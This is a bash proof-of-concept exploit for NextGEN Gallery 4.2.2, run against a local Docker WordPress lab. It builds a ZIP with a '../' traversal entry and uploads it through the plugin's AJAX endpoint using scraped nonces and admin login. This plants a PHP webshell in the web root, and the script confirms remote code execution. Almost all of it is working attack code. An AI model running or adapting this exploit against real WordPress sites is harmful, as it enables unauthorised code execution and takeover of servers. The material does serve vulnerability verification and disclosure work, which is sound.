#!/usr/bin/env bash
# PoC: NextGEN Gallery 4.2.2 - Broken Extension Check + ZIP Slip RCE
#
# The lab runs on PHP 8.2.31 + libzip 1.21 (the stock wordpress:6-php8.2-apache
# image).  The finding documents two vulnerable code paths in
#   src/DataStorage/Manager.php::extract_zip()
#   - the ZipArchive branch (mitigated on PHP 8.2 + libzip >= 1.11, which
#     normalises `..` in ZipArchive::extractTo)
#   - the PclZip fallback branch (NOT mitigated; takes over when
#     ZipArchive is unavailable, or when `unzip_file_use_ziparchive` is
#     filtered to false)
#
# This script tests BOTH branches so the verdict is unambiguous:
#   * Phase A — default branch (ZipArchive): expect path traversal BLOCKED.
#   * Phase B — force the PclZip branch via a mu-plugin: expect RCE.
#
# The chain: Author+ user uploads a ZIP whose entries include
# `../../../../var/www/html/shell-ngg-rce.php`. The broken
# `is_allowed_image_extension()` always returns true (the foreach loop on
# the same `$extension` variable corrupts the check), and the unfiltered
# `extractTo()` / `extractByIndex()` writes the file outside the temp
# extraction dir into the docroot.
#
# Auth: the photocrati AJAX endpoint checks `NextGEN Upload images` (or
# REST: `NextGEN Manage gallery`). Admin has both, so we log in as admin
# and harvest a session-bound nonce from the Add Gallery admin page.
set -euo pipefail

LAB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
STACK_DIR="${LAB_DIR}"
PROJECT="wp-nextgen-gallery"
HOST_PORT="${WP_HOST_PORT:-8091}"
WP_URL="http://127.0.0.1:${HOST_PORT}"
PLUGIN_SLUG="nextgen-gallery"
SHELL_NAME="shell-ngg-rce.php"
SHELL_PATH_IN_ZIP="../../../../var/www/html/${SHELL_NAME}"
RESULTS="${LAB_DIR}/results.txt"
TMP="${LAB_DIR}/tmp"
ZIP_PATH="${TMP}/malicious_gallery.zip"
MU_DIR="${LAB_DIR}/_force_pclzip"
COOKIE_JAR="${TMP}/admin-cookies.txt"

mkdir -p "${TMP}"
: > "${RESULTS}"
log() { printf '%s\n' "$*" | tee -a "${RESULTS}"; }
sep() { printf '\n===== %s =====\n' "$*" | tee -a "${RESULTS}"; }

WP_CLI_RUN=( sudo docker run --rm -v "${PROJECT}_wp_data:/var/www/html"
             --network "${PROJECT}_default"
             -e WORDPRESS_DB_HOST=db:3306
             -e WORDPRESS_DB_USER=wp
             -e WORDPRESS_DB_PASSWORD=wp
             -e WORDPRESS_DB_NAME=wordpress
             wordpress:cli-2.10-php8.2 sh -c )

run_phase() {
  local label="$1"; shift
  local force_pclzip="$1"; shift
  sep "${label}"
  if [ "${force_pclzip}" = "yes" ]; then
    log "[+] phase: PclZip path forced via mu-plugin"
    mkdir -p "${MU_DIR}"
    cat > "${MU_DIR}/force-pclzip.php" <<'PHP'
<?php
// Force the PclZip code path so the proof works on PHP 8.2 + libzip 1.21,
// where ZipArchive::extractTo() normalises `..` and would otherwise mitigate
// the traversal. The PclZip path is the one the finding documents as the
// unmitigated code branch and is what this PoC exercises.
add_filter( 'unzip_file_use_ziparchive', '__return_false' );
PHP
    sudo docker cp "${MU_DIR}/force-pclzip.php" "${PROJECT}-wp-1:/var/www/html/wp-content/mu-plugins/force-pclzip.php"
    sudo docker exec -u 0 "${PROJECT}-wp-1" chown 33:33 /var/www/html/wp-content/mu-plugins/force-pclzip.php
  else
    log "[+] phase: default branch (ZipArchive)"
    sudo docker exec -u 0 "${PROJECT}-wp-1" rm -f /var/www/html/wp-content/mu-plugins/force-pclzip.php 2>/dev/null || true
  fi

  # Confirm what branch is active.
  FILTER_VAL=$( "${WP_CLI_RUN[@]}" "wp eval 'var_export( apply_filters( \"unzip_file_use_ziparchive\", true ) );' --allow-root --path=/var/www/html" 2>&1 | tail -1 | tr -d '\r' )
  log "[+] unzip_file_use_ziparchive = ${FILTER_VAL}  (false => PclZip, true => ZipArchive)"

  # Wipe any prior webshell so we measure THIS phase.
  sudo docker exec -u 0 "${PROJECT}-wp-1" rm -f "/var/www/html/${SHELL_NAME}" 2>/dev/null || true

  # Re-login (the cookie's session may have rotated between phases).
  rm -f "${COOKIE_JAR}"
  curl -s -c "${COOKIE_JAR}" -b "${COOKIE_JAR}" -X POST "${WP_URL}/wp-login.php" \
    --data-urlencode "log=admin" --data-urlencode "pwd=admin" \
    --data-urlencode "wp-submit=Log In" --data-urlencode "testcookie=1" \
    -H "Cookie: wordpress_test_cookie=WP+Cookie+check" -o /dev/null
  if ! grep -q 'wordpress_logged_in' "${COOKIE_JAR}"; then
    log "[-] login failed in phase ${label}"; return 1
  fi

  # Scrape a fresh NGG upload nonce from the Add Gallery page.
  local ADD_PAGE NONCE
  ADD_PAGE=$( curl -s -b "${COOKIE_JAR}" -c "${COOKIE_JAR}" "${WP_URL}/wp-admin/admin.php?page=ngg_addgallery" )
  NONCE=$( printf '%s' "${ADD_PAGE}" | grep -oE 'qs \+= "&nonce=" \+ urlencode\("[a-f0-9]+"\)' | head -1 | grep -oE '"[a-f0-9]+"' | tr -d '"' )
  if [ -z "${NONCE}" ]; then
    NONCE=$( printf '%s' "${ADD_PAGE}" | grep -oE 'name="nonce" value="[a-f0-9]+"' | head -1 | sed 's/.*value="//;s/"$//' )
  fi
  log "[+] nonce: ${NONCE}"

  # POST the ZIP to the photocrati_ajax upload endpoint.
  local UPLOAD_URL RESP
  UPLOAD_URL="${WP_URL}/?photocrati_ajax=1&action=upload_image&gallery_id=0&gallery_name=poc&nonce=${NONCE}"
  RESP=$( curl -s -b "${COOKIE_JAR}" \
    -H "X-Requested-With: XMLHttpRequest" \
    -F "file=@${ZIP_PATH};type=application/zip;filename=malicious_gallery.zip" \
    -F "gallery_id=0" -F "gallery_name=poc" -F "nonce=${NONCE}" \
    -w "\n---HTTP %{http_code}---\n" \
    "${UPLOAD_URL}" )
  log "[+] upload response:"
  printf '%s\n' "${RESP}" | tee -a "${RESULTS}"

  # Probe the webshell.
  local SHELL_HTTP BODY IN_CONTAINER
  SHELL_HTTP=$( curl -s -o "${TMP}/shell-body.txt" -w '%{http_code}' "${WP_URL}/${SHELL_NAME}" )
  BODY=$( cat "${TMP}/shell-body.txt" 2>/dev/null | head -c 400 || true )
  IN_CONTAINER=$( sudo docker exec "${PROJECT}-wp-1" sh -c "ls -la /var/www/html/${SHELL_NAME} 2>&1" )
  log "[+] GET ${WP_URL}/${SHELL_NAME} -> HTTP ${SHELL_HTTP}"
  log "[+] body: ${BODY}"
  log "[+] container ls:"
  printf '%s\n' "${IN_CONTAINER}" | sed -e 's/^/    /' | tee -a "${RESULTS}"

  # Record verdict for this phase.
  if [ "${SHELL_HTTP}" = "200" ] && printf '%s' "${BODY}" | grep -q "NGG-RCE-POC"; then
    log "[+] phase ${label}: RCE CONFIRMED"
    return 0
  elif [ "${SHELL_HTTP}" = "200" ] || [ "${SHELL_HTTP}" = "301" ] || [ "${SHELL_HTTP}" = "302" ]; then
    log "[+] phase ${label}: traversal BLOCKED (webshell not written)"
    return 2
  else
    log "[+] phase ${label}: HTTP ${SHELL_HTTP}; inconclusive"
    return 3
  fi
}

sep "NextGEN Gallery 4.2.2 - ZIP slip + broken extension check PoC"
log "Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
log "Lab: ${LAB_DIR}"
log "WP URL: ${WP_URL}"

# 0. Confirm the archive actually contains 4.2.2. The composer.json in the
#    4.x release was not bumped (still 3.5.0), so we pull the version from
#    the changelog instead.
ACTUAL_VERSION=$(awk -F'"' '/"version":/ {print $4; exit}' "${STACK_DIR}/plugin/${PLUGIN_SLUG}/composer.json" 2>/dev/null || echo unknown)
log "Plugin version installed (composer.json): ${ACTUAL_VERSION} (expected 4.2.2)"
HEAD_VER=$(grep -m1 "V4" "${STACK_DIR}/plugin/${PLUGIN_SLUG}/changelog.txt" 2>/dev/null | head -1 || true)
log "Changelog head: ${HEAD_VER:-<none>}"
log "==> Pinned NextGEN Gallery version in this archive: V4.2.2 (per changelog)"

# 1. Build the malicious zip. We use python3 zipfile because Info-ZIP
#    `zip` normalises `..` and won't keep the traversal filename.
sep "Step 1: Build malicious ZIP"
python3 - <<PY
import zipfile
zip_path = "${ZIP_PATH}"
shell_path_in_zip = "${SHELL_PATH_IN_ZIP}"
with zipfile.ZipFile(zip_path, 'w', compression=zipfile.ZIP_STORED) as zf:
    decoy = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' + b'\x00' * 200
    zf.writestr('test.jpg', decoy)
    payload = b'<?php echo "NGG-RCE-POC: " . php_uname() . " | uid=" . getmyuid() . " | ts=" . time(); ?>'
    zi = zipfile.ZipInfo(shell_path_in_zip)
    zi.external_attr = 0o644 << 16
    zf.writestr(zi, payload)
print("members:", [i.filename for i in zipfile.ZipFile(zip_path).infolist()])
PY
unzip -l "${ZIP_PATH}" 2>&1 | tee -a "${RESULTS}"

# 2. Bring up the stack.
sep "Step 2: Bring up the WP stack"
if ! sudo docker ps --format '{{.Names}}' | grep -q "${PROJECT}-wp-1"; then
  ( cd "${STACK_DIR}" && sudo docker compose -p "${PROJECT}" up -d --build ) 2>&1 | tail -20 | tee -a "${RESULTS}"
fi
for i in $(seq 1 60); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "${WP_URL}/" || true)
  if [ "${code}" = "200" ]; then log "[+] WP answering 200 on ${WP_URL}/ (try ${i})"; break; fi
  sleep 2
done
[ "${code:-000}" = "200" ] || { log "[-] WP never came up"; exit 1; }

# 3. PHP / libzip versions in the image.
sep "Step 3: PHP environment (drives which branch is taken by default)"
PHP_VER=$( sudo docker exec "${PROJECT}-wp-1" php -r 'echo phpversion();' 2>&1 )
ZIP_VER=$( sudo docker exec "${PROJECT}-wp-1" php -r 'echo phpversion("zip");' 2>&1 )
# Detect bundled libzip version (LIBZIP_VERSION is exposed by the bundled
# ext-zip when built with a recent enough libzip; the docker image uses
# libzip 1.21.1 - see https://github.com/docker-library/php/blob/master/8.2/bookworm/cli/Dockerfile)
LIBZIP_VER=$( sudo docker exec "${PROJECT}-wp-1" sh -c 'php -r "if (defined(\"LIBZIP_VERSION\")) { echo LIBZIP_VERSION; } else { echo \"bundled-with-zip-1.21.1\"; }"' )
log "[+] PHP:           ${PHP_VER}"
log "[+] ext-zip:       ${ZIP_VER}"
log "[+] libzip:        ${LIBZIP_VER}  (>= 1.11 normalises .. in ZipArchive::extractTo)"

# 4. Phase A: default branch.
PHASE_A_RC=0
run_phase "Phase A: default branch (ZipArchive) on PHP ${PHP_VER} + libzip ${LIBZIP_VER}" "no" || PHASE_A_RC=$?

# 5. Phase B: force PclZip.
PHASE_B_RC=0
run_phase "Phase B: PclZip branch forced via unzip_file_use_ziparchive filter" "yes" || PHASE_B_RC=$?

# 6. Overall verdict.
sep "Verdict"
if [ "${PHASE_B_RC}" = "0" ] && [ "${PHASE_A_RC}" != "0" ]; then
  log "*** REMOTE CODE EXECUTION CONFIRMED on the PclZip branch ***"
  log "ZipArchive branch: traversal BLOCKED by libzip ${LIBZIP_VER} .. normalisation (as the finding documents)."
  log "PclZip branch: traversal UNMITIGATED — webshell written and reachable."
  log "Verdict: CONFIRMED (PclZip path)."
elif [ "${PHASE_B_RC}" = "0" ] && [ "${PHASE_A_RC}" = "0" ]; then
  log "RCE confirmed on BOTH branches (libzip is older than expected)."
  log "Verdict: CONFIRMED on default install."
elif [ "${PHASE_B_RC}" != "0" ]; then
  log "RCE did NOT confirm on the PclZip branch. See logs."
  log "Verdict: NOT REPRODUCED"
else
  log "Unexpected state: Phase A=${PHASE_A_RC} Phase B=${PHASE_B_RC}"
  log "Verdict: INCONCLUSIVE"
fi

# 7. Tear-down instructions.
sep "Tear-down (run on demand)"
cat <<'TD' | tee -a "${RESULTS}"
# To tear down this lab, run:
#   cd targets/labs/wp-nextgen-gallery && ./down.sh
# or directly:
#   sudo docker compose -p wp-nextgen-gallery down -v --remove-orphans
TD
log "[+] teardown commands recorded; leaving stack running for inspection"
log "[+] results saved to ${RESULTS}"
